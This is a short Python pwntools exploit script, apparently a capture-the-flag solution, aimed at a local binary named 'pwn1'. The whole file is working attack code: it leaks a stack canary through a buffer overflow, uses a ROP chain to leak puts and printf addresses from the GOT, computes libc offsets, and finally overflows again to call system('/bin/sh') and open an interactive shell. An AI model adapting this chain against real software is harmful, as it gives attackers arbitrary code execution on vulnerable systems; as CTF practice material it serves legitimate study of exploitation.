from pwn import *

p = process('./pwn1')

r = p32(0x80483ea)
pr = p32(0x8048401)
ppr = p32(0x804871a)
pppr = p32(0x8048719)

puts_plt = p32(0x8048460)
puts_got = p32(0x804a01c)
printf_got = p32(0x804a014)

vuln = p32(0x804859b)

payload = 'a' * 0x80
p.sendline(payload)

p.readline()
p.readline()

canary = p.readline()
canary = '\00' + canary[:3]

payload = 'y'
payload += 'a' * 0x80
payload += canary
payload += "a" * (0x8c + 4 - len(payload) + 1)
payload += puts_plt + pr + puts_got
payload += puts_plt + pr + printf_got
payload += vuln

p.sendline(payload)
p.sendline('n')
p.recvline()
p.recvuntil(" : ")
puts = u32(p.recv(4))
p.recvline()
printf = u32(p.recv(4))

print "puts: " + hex(puts)
print "printf: " + hex(printf)

#libc6-i386_2.23-0ubuntu11_amd64

offset_system = 0x3a940
offset_binsh = 0x15902b
offset_puts = 0x5f140

system = puts - offset_puts + offset_system
binsh = puts - offset_puts + offset_binsh

print "system: " + hex(system)
print "/bin/sh:" + hex(binsh)

payload = 'y'
payload += 'a' * 0x80
payload += canary
payload += 'a' * (0x8c + 4 - len(payload) + 1)
payload += p32(system) + r + p32(binsh)

p.sendline(payload)
p.sendline('n')

#gdb.attach(p)

p.interactive()
